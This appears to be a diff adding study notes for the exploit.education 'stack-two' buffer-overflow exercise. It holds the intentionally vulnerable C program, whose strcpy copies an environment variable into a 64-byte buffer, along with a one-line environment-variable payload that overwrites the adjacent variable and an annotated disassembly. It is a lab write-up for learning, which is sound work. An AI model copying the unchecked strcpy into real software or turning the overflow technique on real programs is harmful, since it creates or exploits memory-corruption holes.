@@ -1,0 +1,101 @@
+/*
+ * phoenix/stack-two, by https://exploit.education
+ *
+ * The aim is to change the contents of the changeme variable to 0x0d0a090a
+ *
+ * If you're Russian to get to the bath room, and you are Finnish when you get
+ * out, what are you when you are in the bath room?
+ *
+ * European!
+ */
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+int main(int argc, char **argv) {
+  struct {
+    char buffer[64];
+    volatile int changeme;
+  } locals;
+
+  char *ptr;
+
+  printf("%s\n", BANNER);
+
+  ptr = getenv("ExploitEducation");
+  if (ptr == NULL) {
+    errx(1, "please set the ExploitEducation environment variable");
+  }
+
+  locals.changeme = 0;
+  strcpy(locals.buffer, ptr);
+
+  if (locals.changeme == 0x0d0a090a) {
+    puts("Well done, you have successfully set changeme to the correct value");
+  } else {
+    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
+        locals.changeme);
+  }
+
+  exit(0);
+}
+
+0x0d 0x0a 0x09 0x0a
+\r   \n   \t   \n
+
+\n
+\t
+\n
+\r
+
+// Solution: 
+export ExploitEducation=$(python -c "print('a'*64 + '\n\t\n\r')")
+
+0x00000000004006ad <+0>:	push   rbp
+0x00000000004006ae <+1>:	mov    rbp,rsp
+0x00000000004006b1 <+4>:	sub    rsp,0x60
+
+// Load argc and argv
+0x00000000004006b5 <+8>:	mov    DWORD PTR [rbp-0x54],edi
+0x00000000004006b8 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
+
+// Print banner
+0x00000000004006bc <+15>:	mov    edi,0x400790
+0x00000000004006c1 <+20>:	call   0x400500 <puts@plt>
+
+0x00000000004006c6 <+25>:	mov    edi,0x4007da
+0x00000000004006cb <+30>:	call   0x4004f0 <getenv@plt>
+
+0x00000000004006d0 <+35>:	mov    QWORD PTR [rbp-0x8],rax
+0x00000000004006d4 <+39>:	cmp    QWORD PTR [rbp-0x8],0x0
+0x00000000004006d9 <+44>:	jne    0x4006ef <main+66>
+0x00000000004006db <+46>:	mov    esi,0x4007f0
+0x00000000004006e0 <+51>:	mov    edi,0x1
+0x00000000004006e5 <+56>:	mov    eax,0x0
+0x00000000004006ea <+61>:	call   0x400510 <errx@plt>
+0x00000000004006ef <+66>:	mov    DWORD PTR [rbp-0x10],0x0
+0x00000000004006f6 <+73>:	mov    rdx,QWORD PTR [rbp-0x8]
+0x00000000004006fa <+77>:	lea    rax,[rbp-0x50]
+0x00000000004006fe <+81>:	mov    rsi,rdx
+0x0000000000400701 <+84>:	mov    rdi,rax
+0x0000000000400704 <+87>:	call   0x4004d0 <strcpy@plt>
+0x0000000000400709 <+92>:	mov    eax,DWORD PTR [rbp-0x10]
+0x000000000040070c <+95>:	cmp    eax,0xd0a090a
+0x0000000000400711 <+100>:	jne    0x40071f <main+114>
+0x0000000000400713 <+102>:	mov    edi,0x400828
+0x0000000000400718 <+107>:	call   0x400500 <puts@plt>
+0x000000000040071d <+112>:	jmp    0x400733 <main+134>
+0x000000000040071f <+114>:	mov    eax,DWORD PTR [rbp-0x10]
+0x0000000000400722 <+117>:	mov    esi,eax
+0x0000000000400724 <+119>:	mov    edi,0x400870
+0x0000000000400729 <+124>:	mov    eax,0x0
+0x000000000040072e <+129>:	call   0x4004e0 <printf@plt>
+0x0000000000400733 <+134>:	mov    edi,0x0
+0x0000000000400738 <+139>:	call   0x400520 <exit@plt>
+
